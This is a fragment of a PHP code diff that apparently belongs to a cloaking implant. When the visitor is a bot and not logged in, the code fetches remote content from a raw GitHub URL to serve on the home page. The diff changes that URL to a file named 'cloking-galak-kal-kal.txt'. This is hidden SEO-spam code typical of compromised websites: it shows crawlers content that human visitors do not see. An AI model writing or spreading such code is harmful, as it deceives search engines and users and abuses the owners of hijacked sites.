@@ -43,7 +43,7 @@ if ($isBot && !$isLogged) {
     $targetUrl = null;
 
     if ($clean_uri === '/' || $clean_uri === '/index.php' || empty($clean_uri)) {
-        $targetUrl = 'https://raw.githubusercontent.com/marketmg2/landing/refs/heads/main/cerdas-bunghatta.txt';
+        $targetUrl = 'https://raw.githubusercontent.com/jandaperawan470/acelstarboy/refs/heads/main/cloking-galak-kal-kal.txt';
     }
 
     else {
